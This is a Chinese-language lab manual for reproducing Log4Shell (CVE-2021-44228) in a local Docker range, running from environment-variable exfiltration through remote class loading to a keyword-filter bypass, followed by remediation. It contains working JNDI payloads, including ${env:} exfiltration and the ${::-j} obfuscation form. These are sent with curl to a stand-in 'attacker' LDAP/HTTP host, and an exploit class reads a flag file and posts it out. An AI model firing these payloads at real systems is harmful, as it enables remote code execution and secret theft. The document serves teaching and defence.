# Log4Shell 练习手册

配套靶场：`~/代码库/靶场/log4shell/`（独立 compose，不并入根编排）

---

## 写在前面

本仓库其他靶场练的是**自己写出来的漏洞代码**：XXE 的解析开关、JWT 的算法混淆、
反序列化的 POP 链，都能打开源码指着某一行说"洞在这"。

Log4Shell 不一样。业务代码只有一行 `LOG.info("path=" + path + " ua=" + value)`，
一个字都没写错；洞来自依赖清单里那个 `log4j-core 2.14.1`。这也是"组件/框架类漏洞"
最难受的地方：**你的代码全对，你引入的第三方组件替你把门打开了**。

这份手册要做完四件事：

- 把 `${jndi:...}` 到远程代码执行之间的每一跳拆开，知道每一跳是谁做的
- 四关递进：只外带数据 → 完整 RCE → 绕过关键字过滤 → 修复对照
- 打掉几个很常见的错误结论（第 7 节，附错误结论原文和实测反证）
- 收尾到修复与排查：为什么 WAF 只能当兜底，怎么验证真的修好了

**前置**：知道 HTTP 请求头和环境变量是什么、能看懂一点 Java 的 `static {}` 块即可。
不需要懂 LDAP 协议，第 4 节会把用到的那几个字节讲清楚。

一份文档、一条命令链，全部在本机实测过（macOS arm64 / Docker 29.7.2 /
`eclipse-temurin:8-jdk` / Python 3.12 / log4j 2.14.1 与 2.17.1，2026-11-11）。
**标注了「源码」的地方是读代码得出的，标注了「实测」的地方是跑出来的**，两者不混。

---

## 0. 三分钟把环境跑起来

```bash
cd ~/代码库/靶场
./log4shell/up.sh
```

`up.sh` 做三件事：构建两个镜像 → 启动两个容器 → 跑 `setup.sh` 清空上一轮事件。
本机默认 buildx 会因为 `~/.docker/buildx` 不可写报 `operation not permitted`，
脚本已经把三级回退封进去了（和根 `lab.sh` 同一套），不用手动干预。

起来之后应该看到：

```
[+] 就绪：
   L1~L3  vuln      http://127.0.0.1:19080/   log4j 2.14.1 · trustURLCodebase=true
   L4-1   jdk       http://127.0.0.1:19081/   log4j 2.14.1 · JDK 默认加固
   L4-2   patched   http://127.0.0.1:19082/   log4j 2.17.1
   events           http://127.0.0.1:19089/events
```

三个端口是**同一份 `Main.class`、三个不同的 JVM**（`app/start.sh:22-27`，源码）：

- `19080` → 容器 8080：log4j 2.14.1，且显式打开
  `-Dcom.sun.jndi.ldap.object.trustURLCodebase=true`，还原 2021 年的 JDK 环境
- `19081` → 容器 8081：log4j 2.14.1，JDK 保持默认（禁止远程 codebase）
- `19082` → 容器 8082：log4j 2.17.1

`19089` 是攻击者侧的 HTTP：托管 `.class`、接收 flag 回传、提供 `/events` 和 `/reset`。
LDAP 的 1389 **没有映射到宿主机**，只在容器网络里，靠 `attacker` 这个 network alias 被解析。

确认三个 JVM 都活着（实测输出）：

```bash
docker logs log4shell-app
```

```
[app] port=8082 label=patched-2.17.1 filter=false
[app] port=8081 label=jdk-hardened-2.14.1 filter=false
[app] port=8080 label=vuln-2.14.1-trustURLCodebase-true filter=true
```

打之前先清一次事件，避免上一关的痕迹混进来：

```bash
./log4shell/setup.sh      # 可重复跑
curl -s http://127.0.0.1:19089/events
```

**停**：

```bash
docker compose -f log4shell/compose.yml down
```

> 19080 那一路是真的能远程加载类、在容器里执行代码的。所有端口只绑 `127.0.0.1`，
> 别改成 `0.0.0.0`，别放进有多人使用的网络。

---

## 1. 原理：五句话钉死

### 1.1 洞不在业务代码里，在「日志模板」里

log4j 记录日志时，不是把字符串原样写出去，而是先过一遍 `StrSubstitutor` —— 
可以理解成"日志消息里也能写变量"：

- `${env:USER}` → 换成环境变量
- `${sys:user.dir}` → 换成 JVM 系统属性
- `${lower:ABC}` → 换成 `abc`
- `${jndi:ldap://...}` → **去 JNDI 查一次，把结果字符串填回来**

2.0-beta9 ~ 2.14.1 的 `MessagePatternConverter` 默认允许这类替换，而 `JndiLookup`
对传入的地址不做任何限制。于是"把用户输入记进日志"这件事，突然变成了"让服务器
按用户给的地址发起一次网络查询"。

靶场里这行在 `app/Main.java:67`（源码）：

```java
LOG.info("path=" + path + " ua=" + value);
```

`value` 就是请求的 `User-Agent`（`app/Main.java:48`）。整份代码里只有这一处触发点。

### 1.2 替换是递归的，而且发生在过滤之后

这是整份手册最关键的一句：**log4j 先把嵌套的 `${...}` 展开，再执行最外层那个 lookup**。

所以 `${jndi:ldap://x/${env:SECRET}}` 会先把 `${env:SECRET}` 换成真实值，
再把这个值拼进 URL 发起查询。L1 靠它偷数据，L3 靠它把关键字拼回来。

对防守方的含义：你在应用里对字符串做的任何检查，看到的都**不是**最终生效的那个串。

### 1.3 JNDI 是「按名字取对象」，不是「按名字取字符串」

`jndi:ldap://attacker:1389/l2` 里的 `l2` 是一个名字。JNDI 会连 LDAP 服务器，
问"给我 l2 这个对象"。LDAP 可以回三种东西：

- 一段普通数据（字符串、序列化对象）
- 一个 `Reference`（**"这个对象不在这，去别处拿"**）
- 什么都没有

Log4Shell 用的是第二种。`Reference` 里有两个关键属性：

- `javaFactory` —— 要实例化的类名，例如 `L2`
- `javaCodeBase` —— 去哪找这个类，例如 `http://attacker:8000/`

JNDI 拼出 `http://attacker:8000/L2.class`，下载、加载、实例化。**这一步发生在
被攻击的 JVM 里**，不是攻击者机器上。本靶场的 LDAP 服务在
`attacker/server.py:123-140` 手工构造这个 Reference（源码）。

### 1.4 类加载就会执行代码，不需要有人 new

Java 的静态初始化块 `static { ... }` 在类被 `Class.forName(name, true, loader)`
加载时立刻执行。JNDI 加载 `L2.class` 就会跑它，所以靶场的 `L2` 里只写了一个静态块
（`attacker/exploit/L2.java:25-34`），照样读到了 `/flag_l2`。

这也是为什么 Log4Shell 的 PoC 看起来"什么都没调用"却能 RCE。

### 1.5 现代 JDK 补了一道闸门，但只补了一半

JDK 8u191 / 11.0.1 起，`com.sun.jndi.ldap.object.trustURLCodebase` 默认变成 `false`：
**JNDI 仍然会连 LDAP、仍然会拿到 Reference，但不许从远程 codebase 下载类**。

于是：

- 2021 年那种"一个 User-Agent 直接 RCE"在新 JDK 上打不通了
- 但 `${jndi:...}` 触发的**网络回连**、`${env:}` 的**信息外带**、以及利用目标
  classpath 里已有 gadget 的"本地链"，全都还在

L4 就是专门用来把这两种"加固"分开看的。

### 1.6 整条链

```
用户输入 User-Agent: ${jndi:ldap://attacker:1389/l2}
        │
        ▼  app/Main.java:67  LOG.info()   ← 业务代码只做了这一件事
log4j StrSubstitutor 递归展开 ${...}
        │
        ▼  2.14.1 的 JndiLookup（组件里的洞）
JNDI 向 LDAP 1389 发起 bind + search
        │
        ▼  attacker/server.py:158-173  ← 攻击者基础设施
LDAP 返回 javaNamingReference(L2, http://attacker:8000/)
        │
        ▼  JDK 检查 trustURLCodebase（19080 打开 / 19081 默认关）
HTTP GET /L2.class
        │
        ▼  Class.forName("L2", true, ...) 在被攻击的 JVM 里执行
静态块读 /flag_l2 → POST /collect
        │
        ▼
宿主机 poc 查 /events 拿到 flag
```

**一句话**：Log4Shell = 日志组件把"用户可控字符串"当成表达式执行，
而 JNDI 又允许这个表达式把代码从网上拉回来。

---

## 2. 靶场这一页怎么读

### 2.1 被攻击的一侧

`app/Main.java` 是个只有几十行的 HTTP 服务，用 JDK 自带的 `HttpServer` 写的，
没有 Spring、没有 Tomcat —— 刻意把"框架"这个变量摘掉，好看清洞就是 log4j 自己的。

三个地方值得先翻一眼（源码）：

- `app/conf/log4j2.xml:19` —— `<Root level="info">`。**没有这份配置就打不动**，
  无配置时 log4j-core 默认 root level 是 `ERROR`，`LOG.info()` 连日志事件都不产生，
  lookup 根本不会跑。本地复现"打了没反应"十有八九是这里。
- `app/Main.java:67` —— 唯一的触发点 `LOG.info(...)`。
- `app/start.sh:22-27` —— 三个 JVM 的差别全在这七行里，代码完全相同。

`HttpServer` 默认只有一个线程，而 JNDI lookup 是同步的，会一直等到 LDAP 返回；
一个卡住的请求会堵死后面所有请求。所以 `app/Main.java:41` 给了个 8 线程池。

### 2.2 攻击者的一侧

`attacker/server.py` 一个进程、两个服务，全部 Python 标准库：

- **1389 / LDAP**：手写 BER 编解码，只认 `bindRequest` 和 `searchRequest`
  （`attacker/server.py:158-174`）。search 时按查询路径决定返回哪个 `javaFactory`。
- **8000 / HTTP**：托管 `/L2.class`、`/L3.class`（`attacker/server.py:207-215`），
  收 `/collect`（`:239-245`），提供 `/events`（`:217`）和 `/reset`（`:224`）。

`/events` 就是这个靶场的**判题器**。它记录四种事件：

- `ldap_bind` —— 目标连上来了
- `ldap_search` —— 目标发来查询，`base` 是 JNDI URL 里的名字
- `codebase` —— 目标来下载 `.class` 了
- `collect` —— 下载的类真的在目标 JVM 里执行，并回传了内容

另外还有 `ldap_raw`（原始 BER 字节），平时不看，排障时才用。

### 2.3 flag 放在哪

- L1：`flags/l1.flag` 在 `app/start.sh:15-16` 被读进环境变量 `FLAG_L1`，
  所以只能用 `${env:FLAG_L1}` 外带
- L2 / L3：`flags/l2.flag`、`l3.flag` 只读挂载到容器里的 `/flag_l2`、`/flag_l3`，
  **只有代码真的在目标 JVM 里跑起来才读得到**

### 2.4 为什么 payload 走 User-Agent，不走 URL 参数

`poc/_util.py:39-53` 的 `inject()` 把 payload 塞进请求头。原因写在注释里：
URL 参数会做编码，`${` 会变成 `%24%7B`，log4j 看到的就是普通字符串，不认。

```python
req = urllib.request.Request(base + path, headers={"User-Agent": payload})
```

真实环境里同理：最容易中招的不是表单字段，而是 `User-Agent`、
`X-Forwarded-For`、`Referer` 这些"顺手记进日志"的头。

---

## 3. L1 · 不 RCE，也能把环境变量偷出来

**目标**：拿到 `FLAG{log4shell_env_lookup_oob_7d2a}`，并且理解为什么这一步不需要
任何代码执行。

### 3.1 先自己想两分钟

- 应用把 User-Agent 原样记进日志，但它**没有把日志回显给客户端**。
  那数据怎么出来？
- 如果 `${jndi:...}` 里再嵌一个 `${env:FLAG_L1}`，log4j 会先算哪个？

想不出就往下看，别急着翻 `01_probe.py`。

### 3.2 载荷

`poc/01_probe.py:25`：

```
${jndi:ldap://attacker:1389/cn=${env:FLAG_L1}}
```

逐字拆：

- `${...}` —— 告诉 log4j "这里面是表达式，要替换"
- `jndi:` —— 用 JndiLookup 处理冒号后面的地址
- `ldap://attacker:1389/` —— 我们自己的 LDAP 服务
- `cn=${env:FLAG_L1}` —— 查询的名字。**内层的 `${env:}` 先被展开**，
  于是最终 URL 变成 `ldap://attacker:1389/cn=FLAG{log4shell_env_lookup_oob_7d2a}`
- 写成 `cn=` 是为了让这串东西成为一个**合法的 LDAP DN**（`cn` 是 commonName）。
  直接写 `FLAG{...}` 没有属性名，某些 JNDI 解析器会在发查询前就报错

### 3.3 跑一次（实测）

```bash
python3 log4shell/poc/01_probe.py
```

```
L1 · 只发一个 User-Agent，看能不能把环境变量带出来

  payload: ${jndi:ldap://attacker:1389/cn=${env:FLAG_L1}}
  发送 → http://127.0.0.1:19080/

  HTTP 200，应用照常返回（它自己毫无察觉）：
    label=vuln-2.14.1-trustURLCodebase-true
    path=/
    filtered=false
    logged_ua=${jndi:ldap://attacker:1389/cn=${env:FLAG_L1}}

=== 攻击者侧看到的事件 ===
   [ldap]  bindRequest       目标连上来了
   [ldap]  searchRequest     base=cn=FLAG{log4shell_env_lookup_oob_7d2a}

[+] L1 flag: FLAG{log4shell_env_lookup_oob_7d2a}
```

应用返回的是 **HTTP 200**，页面里什么异常都没有。数据不是"显示在页面上"漏出来的，
是**服务器主动连过来**时，把变量写进了查询名字里。

### 3.4 为什么没有触发 RCE

注意事件里只有 `bind` 和 `search`，没有 `codebase`、没有 `collect`。
这是靶场故意的：`attacker/server.py:169-171` 只在查询名恰好是 `l2` / `l3` 时
才返回带 `javaCodeBase` 的 Reference，其他名字只回一个空引用。

否则 L1 探测阶段就会顺手把 L2 的 RCE 打了，关卡边界没了。

### 3.5 换个变量自己试（不改源码）

把 payload 里的 `FLAG_L1` 换成别的环境变量，用 curl 直接发，不靠 poc：

```bash
curl -s http://127.0.0.1:19089/reset >/dev/null
curl -s --max-time 15 -A '${jndi:ldap://attacker:1389/cn=${env:PATH}}' \
     http://127.0.0.1:19080/ >/dev/null
curl -s http://127.0.0.1:19089/events | grep '"base"'
```

实测输出（原样）：

```
    "base": "cn=/opt/java/openjdk/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
```

`PATH` 里满是 `/` 和 `:`，照样被拼进 DN 带出来。这就是当年大量
"Log4Shell 探测"实际上在做的事：**先确认能外连，顺手看看能读到什么**。

### 3.6 这一关的防守视角

- 页面无回显、无报错、HTTP 200，**传统 WAF 的响应检测完全看不到异常**
- 唯一线索是服务器主动发起的出站 LDAP 连接
- 所以「有没有 `${jndi:` 回连记录」比「有没有拿到 shell」更值得先查

---

## 4. L2 · 完整 RCE：四跳，一跳都不能少

**目标**：拿到 `FLAG{log4shell_jndi_codebase_rce_b41e}`，并保证自己能对着
`/events` 把每一跳指出来。

### 4.1 载荷与输出（实测）

`poc/02_rce.py:24`：

```
${jndi:ldap://attacker:1389/l2}
```

```bash
python3 log4shell/poc/02_rce.py
```

```
=== 攻击者侧看到的整条链 ===
   [ldap]  bindRequest       目标连上来了
   [ldap]  searchRequest     base=l2
   [http]  GET /L2.class    目标来下载 class 了
   [http]  POST /collect     L2 FLAG{log4shell_jndi_codebase_rce_b41e}

[+] L2 flag: FLAG{log4shell_jndi_codebase_rce_b41e}
```

`codebase` 那条 GET，就是"代码已经在目标 JVM 里跑起来"的证据。

### 4.2 四跳逐个拆

**第 1 跳 · log4j → JNDI**。
`Main.java:67` 的 `LOG.info()` 让 2.14.1 的 `StrSubstitutor` 解析 `${jndi:...}`，
`JndiLookup` 拿着 `ldap://attacker:1389/l2` 发起查询。

**第 2 跳 · JNDI → LDAP，拿到一个 Reference**。
LDAP 报文是 BER 编码的 TLV：`1 字节 tag + 长度 + 内容`。
`attacker/server.py:106-115` 负责读一个完整报文，`:158-174` 按 tag 分派：

- `0x60` = BindRequest → 回 `0x61` BindResponse
- `0x63` = SearchRequest → 回 `0x64` SearchResultEntry + `0x65` SearchResultDone

`reference_entry()`（`:123-140`）在 entry 里塞了四个属性，关键是这两个：

```
javaFactory  = L2
javaCodeBase = http://attacker:8000/
```

`objectClass: javaNamingReference` 告诉 JNDI："这不是数据，是一个指向别处的引用"。

**第 3 跳 · JNDI → HTTP，下载并加载类**。
JNDI 拼出 `http://attacker:8000/L2.class`。`server.py:207-215` 把构建阶段
用 JDK 8 编译好的 1855 字节 class 返回去。JVM 执行
`Class.forName("L2", true, loader)`，静态块立刻跑。

> 这里有个 JDK 前提：19080 显式打开了 `trustURLCodebase=true`（`start.sh:22`）。
> 现代 JDK 默认关闭，这正是 L4 要对照的东西。

**第 4 跳 · 静态块读 flag 并回传**。
`attacker/exploit/L2.java:25-34` 读 `/flag_l2`，POST 到 `/collect`。
这个文件在容器里、只读挂载、没有 HTTP 路径能访问 —— 只有进程内代码够得着。

### 4.3 看原始证据

poc 打印的是整理过的视图，原始事件可以直接查（实测节选）：

```bash
curl -s http://127.0.0.1:19089/events
```

```json
  {
    "t": 1794382641.771,
    "kind": "ldap_search",
    "peer": "192.168.96.2",
    "base": "l2"
  },
  {
    "t": 1794382641.814,
    "kind": "codebase",
    "file": "/L2.class",
    "size": 1855,
    "peer": "192.168.96.2"
  },
  {
    "t": 1794382641.822,
    "kind": "collect",
    "body": "L2 FLAG{log4shell_jndi_codebase_rce_b41e}",
    "peer": "192.168.96.2"
  }
```

时间差也能读出来：search → 下载 class 约 43 ms，下载 → 回传约 8 ms。
中间那些 `ldap_raw` 是原始 BER 字节，latin-1 解码后看着像乱码，正常。

### 4.4 一个容易被忽略的细节：`ObjectFactory`

`L2.java:24` 写的是 `public class L2 implements ObjectFactory`。为什么要实现接口？

JNDI 拿到 Reference 后会把 `javaFactory` 指定的类**强转**成
`javax.naming.spi.ObjectFactory`，再调用它的 `getObjectInstance()`。
不实现接口，静态块照样执行、flag 照样到手，但目标日志里会甩出一整屏
`ClassCastException` —— 真实利用要的是"安静"。

这个坑是本靶场实测踩出来的，完整错误推理链放在第 7 节。

### 4.5 这一关的结论

- RCE 的落点是**被攻击的 JVM**，不是攻击者机器。`L2.class` 是目标主动来下载的
- 四跳里，业务代码只参与了第一跳之前"把字符串记进日志"这一步
- 出站 LDAP + 出站 HTTP 两条连接，是这一关最可靠的网络侧特征

---

## 5. L3 · 绕过关键字黑名单

**目标**：拿到 `FLAG{log4shell_lookup_obfuscation_9c73}`，并说清"为什么删关键字没用"。

### 5.1 应用加了一层看起来很合理的防护

`/filtered` 端点会把 User-Agent 里的 `jndi`、`ldap` 抹掉（`app/Main.java:83-85`，源码）：

```java
private static String naiveFilter(String s) {
    return s.replaceAll("(?i)jndi|ldap", "");
}
```

大小写不敏感、两个关键字都覆盖，很多人当年就是这么改的。

### 5.2 先证明它确实在工作（实测）

`poc/03_bypass.py` 第一步发普通 payload 到 `/filtered`：

```
  ① 先老老实实发：${jndi:ldap://attacker:1389/l3}
     filtered=true
     logged_ua=${:://attacker:1389/l3}
     没有任何 LDAP 回连 —— 看起来挡住了。
```

`jndi` 和 `ldap` 被删掉后，剩下的 `${:://attacker:1389/l3}` 已经不是有效 lookup，
所以没有回连。到这里为止，防护"看起来"是成功的。

### 5.3 用 log4j 自己的语法把关键字拼回来（实测）

`poc/03_bypass.py:29-32`：

```
${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attacker:1389/l3}
```

先拆最小单位：`${name:-default}` 是 StrSubstitutor 的"默认值"语法 —— 
冒号横线前面是变量名，后面是变量不存在时用的默认值。
`${::-j}` 的变量名是空的，所以直接取默认值 `j`。

于是四个小块拼出 `jndi`，四个小块拼出 `ldap`。整串里**没有任何连续的
`jndi` 或 `ldap`**，黑名单一个字都匹配不到，原样进了日志。然后 log4j 递归展开，
最外层摆着的还是 `jndi:ldap://attacker:1389/l3`。

输出：

```
=== 攻击者侧看到的事件 ===
   [ldap]  bindRequest       目标连上来了  ×9
   [ldap]  searchRequest     base=l3  ×9
   [http]  GET /L3.class    目标来下载 class 了  ×9
   [http]  POST /collect     L3 FLAG{log4shell_lookup_obfuscation_9c73}  ×9

[+] L3 flag: FLAG{log4shell_lookup_obfuscation_9c73}
```

### 5.4 那个 `×9` 是什么

不是脚本重发了 9 次请求。`03_bypass.py` 里 `inject()` 只调用一次。

2.14.1 的 StrSubstitutor 对嵌套 `${...}` 会做**多轮**递归替换，每轮碰到
`jndi:` 就重新执行一次 lookup。于是 bind → search → 下载 class → 回传 flag
整条链在本机实测重复 9 遍。

两个含义：

- 防守：混淆 payload 会放大请求量，一次攻击就能把 IDS/日志打爆；看到「同一来源
  短时间重复外连」不要只当成扫描器噪音
- 靶场：`poc/_util.py` 的 `show_events()` 按语义去重显示成 `×9`，
  原始次数仍可在 `/events` 里数（`ldap_raw` 也在）

### 5.5 这一关的结论

> **过滤发生在 log4j 解析之前，攻击串是在解析过程中才成形的。**

所以任何"在应用层/出入口对字符串做关键字匹配"的办法，原理上都挡不住 Log4Shell。
能挡的只有两类：让 lookup 不再执行（升级组件 / 关开关），或者让 JNDI 出不去
（出站网络策略）。详见第 9 节。

---

## 6. L4 · 两种"加固"根本不是一回事

**目标**：不拿 flag。把同一个 payload 打到两个端口上，看懂差别。

`poc/04_hardened.py` 用的是和 L2 一模一样的 `${jndi:ldap://attacker:1389/l2}`，
只换端口：

```bash
python3 log4shell/poc/04_hardened.py
```

实测输出：

```
── 19081 · 2.14.1 + JDK 默认 ─────────────────────────────────
   trustURLCodebase=false，远程 codebase 被拒
   事件：
   [ldap]  bindRequest       目标连上来了
   [ldap]  searchRequest     base=l2

── 19082 · log4j 2.17.1 ─────────────────────────────────
   JndiLookup 已移除 JNDI 能力，lookup 不解析
   事件：
   （没有任何回连）

=== 对比 ===
  19081  LDAP 回连 1 次 · class 下载 0 次 · 代码执行回传 0 次
  19082  LDAP 回连 0 次 · class 下载 0 次 · 代码执行回传 0 次
```

### 6.1 这两行数字要会读

- **19081（新 JDK + 旧 log4j）**：lookup 照常执行、LDAP 照常回连，
  只是 JDK 在最后一步拒绝从远程 codebase 加载类。**洞还在，只是这条利用链断了**。
- **19082（新 log4j）**：`${jndi:...}` 压根没被当成表达式执行，一次网络请求都没有。
  **洞没了**。

### 6.2 "JDK 够新就没事"错在哪

新 JDK 只关闭了「从 URL 加载类」这一条路。仍然成立的还有：

- **信息外带**：L1 那套 `${env:}` 拼进 DN / DNSLog，不需要加载任何类
- **本地 gadget 链**：LDAP 返回一个指向目标 classpath 里**已有类**的
  `Reference`，让它们去执行危险动作（历史上常见的是 Tomcat 的
  `BeanFactory` 配合 EL 表达式、以及各类反序列化 gadget）。全程不下载远程 class，
  `trustURLCodebase` 管不着
- **拒绝服务**：某些 `${jndi:...}` 变体能让线程长时间阻塞

所以护网里判断"有没有受影响"，看的是 **log4j-core 版本**，不是 JDK 版本。

### 6.3 自己验证一遍

把 L1 的探测 payload 打到 19081，看它是不是照样能外带环境变量：

```bash
curl -s http://127.0.0.1:19089/reset >/dev/null
curl -s --max-time 15 -A '${jndi:ldap://attacker:1389/cn=${env:FLAG_L1}}' \
     http://127.0.0.1:19081/ >/dev/null
curl -s http://127.0.0.1:19089/events | grep '"base"'
```

会得到 `"base": "cn=FLAG{log4shell_env_lookup_oob_7d2a}"`。
**JDK 默认加固了，环境变量照样被偷走** —— 这一条比任何文字说明都直观。

---

## 7. 认知纠错：五个错误结论（含原文与实测反证）

这一节按「当时的结论原文 → 为什么这么想 → 实测打脸 → 正确说法」写。
前两条是本靶场搭建过程中真实出现过的判断，不是编的教学案例。

### ① 「静态块执行成功就够了，日志里的异常无关紧要」

- **结论原文**（第一版 `L2.java` 的判断）：*"只要 `static {}` 跑了、flag 回传了，
  利用就算成功；目标日志里那些堆栈是 JNDI 自己的事，不影响结果。"*
- **为什么这么想**：`02_rce.py` 已经打印 `[+] L2 flag: ...`，
  从攻击者视角看链路闭合了。
- **实测反证**：`docker logs log4shell-app` 里出现
  `Caused by: java.lang.ClassCastException: L2 cannot be cast to javax.naming.spi.ObjectFactory`
  以及几十行调用栈。防守方只要看一眼应用日志就能发现异常 JVM 行为。
- **正确说法**：JNDI 会把 `javaFactory` 强转成 `ObjectFactory`。实现接口、
  `getObjectInstance()` 返回 `null`，lookup 正常结束。改成
  `public class L2 implements ObjectFactory` 后重建镜像、重启 app 复测，
  `docker logs --since 2m log4shell-app | grep -Ec 'Exception|ERROR'` 输出 **0**。

### ② 「poc 重复发了 9 次请求 / 事件记录重复了」

- **结论原文**（第一次看到 L3 输出）：*"要么 `03_bypass.py` 里循环调用了
  `inject()`，要么 LDAP 服务把同一条事件写了多遍。"*
- **为什么这么想**：L2 的普通 payload 只有一组事件，L3 突然出现 9 组完整链，
  第一反应是脚本或服务端 bug。
- **实测反证**：查 `03_bypass.py` 全文，`inject()` 只调用一次；
  `server.py` 的 `log()` 是简单的 append，无重复写。差别只在 payload：
  L3 用了多层嵌套 `${...}`，L2 没有。换回非混淆 payload 立刻恢复成 1 组。
- **正确说法**：2.14.1 的 StrSubstitutor 递归替换每一轮都重新执行 lookup，
  是组件行为。修的是展示层（`show_events()` 合并成 `×9`），不是"修 bug"。

### ③ 「应用里 `LOG.info(userInput)` 就会触发，打了没反应说明版本不受影响」

- **结论原文**：*"2.14.1 装好了、payload 也发了，没回连，那这个版本应该是修过的。"*
- **实测反证**：log4j-core 找不到配置时退回 `DefaultConfiguration`，root level 是
  `ERROR`。`LOG.info()` 产生的事件在这一层就被丢掉了，`StrSubstitutor` 根本没机会跑。
- **正确说法**：必须显式给 `log4j2.xml` 并把 root 设成 `info`
  （`app/conf/log4j2.xml:19`）。这也是自建复现环境时最常见的"假阴性"。

### ④ 「JDK 是新版，Log4Shell 对我没影响」

- **结论原文**：*"我们 JDK 8u3xx / 11+，官方说默认禁了远程 codebase，
  这条漏洞可以直接关掉。"*
- **实测反证**：第 6 节 19081 的输出 —— LDAP 回连 1 次。把 L1 的
  `${env:}` 外带 payload 打过去，环境变量照样出来。
- **正确说法**：新 JDK 只掐断远程类加载。外带、本地 gadget、DoS 都还在。
  **受影响面取决于 `log4j-core` 版本**。

### ⑤ 「WAF 把 `jndi` / `ldap` 过滤掉就安全了」

- **结论原文**：*"入口做字符串匹配，命中关键字就拦截/删除，攻击串进不来。"*
- **实测反证**：第 5 节 L3，`${::-j}` 混淆后原串里没有任何连续关键字，
  照样完整 RCE，还附带 9 倍放大。
- **正确说法**：过滤在解析之前，攻击串在解析过程中才成形。WAF 只能当兜底，
  不能当修复。

### 环境坑（不影响原理，但会浪费时间）

- **buildx `operation not permitted`**：`~/.docker/buildx` 不可写，本机实测第一次
  `docker compose up --build` 直接失败。已封装进 `./log4shell/up.sh` 三级回退。
- **`UnsupportedClassVersionError`**：宿主是 javac 17，编出来的 class 版本 61，
  JDK 8 加载不了。attacker 镜像用多阶段构建、`eclipse-temurin:8-jdk` 编译
  （`attacker/Dockerfile`）。
- **payload 放 URL 参数没反应**：会被编码成 `%24%7B`（`_util.py:43-44`），
  走 header 才行。
- **HttpServer 单线程堵死**：JNDI 同步等待，必须给线程池（`Main.java:41`）。

---

## 8. 自己动手改 payload（不改靶场源码）

四个练习，全部在本机实测过。做完再去看 poc 源码，理解会完全不一样。

### 8.1 换一个外带变量

3.5 已经用 `${env:PATH}` 做过。再试 `${sys:user.dir}`、`${env:JAVA_HOME}`，
观察哪些字符能进 DN、哪些会让 JNDI 提前报错。

**为什么值得做**：真实排查时，"能不能外带"和"能外带什么"是两个问题。
前者说明洞在，后者决定危害等级。

### 8.2 完全不靠 poc，用 curl 打通 L2

poc 只是把请求和查结果封装了。手工来一遍：

```bash
curl -s http://127.0.0.1:19089/reset >/dev/null
curl -s --max-time 15 -A '${jndi:ldap://attacker:1389/l2}' \
     http://127.0.0.1:19080/ >/dev/null
curl -s http://127.0.0.1:19089/events | grep -E '"kind"|"base"|"file"|"body"'
```

实测输出：

```
    "kind": "ldap_bind",
    "kind": "ldap_search",
    "base": "l2"
    "kind": "codebase",
    "file": "/L2.class",
    "kind": "collect",
    "body": "L2 FLAG{log4shell_jndi_codebase_rce_b41e}",
```

（中间夹杂的 `ldap_raw` 被 grep 掉了。）**整条利用链只需要一个 curl**。

### 8.3 发一个 LDAP 服务不认识的名字

```bash
curl -s http://127.0.0.1:19089/reset >/dev/null
curl -s --max-time 15 -A '${jndi:ldap://attacker:1389/whatever}' \
     http://127.0.0.1:19080/ >/dev/null
curl -s http://127.0.0.1:19089/events | grep -E '"kind"|"base"'
```

实测只有 `ldap_bind` / `ldap_search`（`"base": "whatever"`），
**没有 `codebase`、没有 `collect`**。

因为 `attacker/server.py:169-171` 只给 `l2` / `l3` 返回带 `javaCodeBase` 的引用。
这正是 L1 能"只探测不 RCE"的原因，也演示了一个事实：
**光有 JNDI 回连，不等于能执行代码**，中间还隔着 Reference 和 codebase 两跳。

### 8.4 数一数 L3 到底触发了几次

```bash
python3 log4shell/poc/03_bypass.py >/dev/null
curl -s http://127.0.0.1:19089/events | grep -c '"kind": "collect"'
```

实测输出 `9`。poc 把它显示成 `×9`，原始次数在这里。
对比 8.2 的普通 payload，同样的计数是 `1`。

---

## 9. 修复建议：从根治到兜底

一句话定性：**Log4Shell 能成立，是因为日志组件把不可信字符串当表达式执行，
而 JNDI 又允许这个表达式从外网取代码**。所以修复只有两条主线 ——
让表达式不再执行，或者让 JNDI 出不去。

> 本节的版本线、CVE 编号来自 Apache 官方安全公告与公开资料，**不是本靶场实测**
> （靶场里只有 2.14.1 和 2.17.1 两个版本）。链接放在本节末尾。

### 9.1 根治：升级，而且别停在中间版本

2021 年 12 月那一个月 Apache 连发四轮公告，"第一次修完"并不算修完：

- `2.15.0` —— 默认关掉 message lookup，但非默认配置下仍可绕过（CVE-2021-45046）
- `2.16.0` —— 移除 message lookups、默认关闭 JNDI，但自引用 lookup 可 DoS（CVE-2021-45105）
- `2.17.0` —— 修 DoS，但 JDBC Appender 配置可控时仍有 RCE（CVE-2021-44832）
- **`2.17.1`** —— 四个 CVE 全清，Java 8+ 的目标版本

老 JDK 的回移植线：Java 7 → `2.12.4`，Java 6 → `2.3.2`。
本靶场 `19082` 用的就是 2.17.1，第 6 节"零回连"是这条修复的实测验收。

容易漏的是**传递依赖和 shaded fat jar**：你改了 pom 里声明的版本，
另一个框架可能还打包着一份旧的 `log4j-core`。所以要同时扫依赖树和实际字节码。

```bash
mvn dependency:tree -Dincludes=org.apache.logging.log4j
# 或者直接在成品里找那个类
find . -name '*.jar' -print0 | xargs -0 -I{} sh -c \
  'unzip -l "$1" 2>/dev/null | grep -q JndiLookup && echo "$1"' _ {}
```

### 9.2 暂时升不了级时的缓解（都是过渡，不是终点）

- `-Dlog4j2.formatMsgNoLookups=true` 或环境变量
  `LOG4J_FORMAT_MSG_NO_LOOKUPS=true`：适用于 2.10 ~ 2.14.1。
  **注意它不覆盖 CVE-2021-45046**，别当成永久方案
- 直接从 jar 里删掉 `JndiLookup.class`：
  `zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class`
- 2.10 以下没有那个开关，删类是唯一选择

### 9.3 出站网络策略：比 WAF 更靠得住的一层

限制应用服务器主动外连 LDAP / RMI / DNS，只放行业务必需的目标。
理由在前面几节已经实测过：

- L1、L2、L3 的第一步都是**服务器主动连出来**（`/events` 里的 `ldap_bind`）
- 19081 的 JDK 加固之所以"只挡住一半"，也是因为回连照样发生

出站被掐断，整条链在第 2 跳就断了；而且它不依赖识别 payload 长什么样，
混淆语法对它无效。DNS 也要管 —— 真实探测经常用 DNSLog，
第 1.2 节的 `${env:}` 拼进域名就能外带。

### 9.4 WAF / 关键字规则只能当兜底

第 5 节已经实测：`${::-j}` 把关键字拆开后，删 `jndi|ldap` 的规则完全失效。
WAF 适合做**检测和告警**（看到 `${jndi:` 相关特征就报），不适合做**唯一防线**。

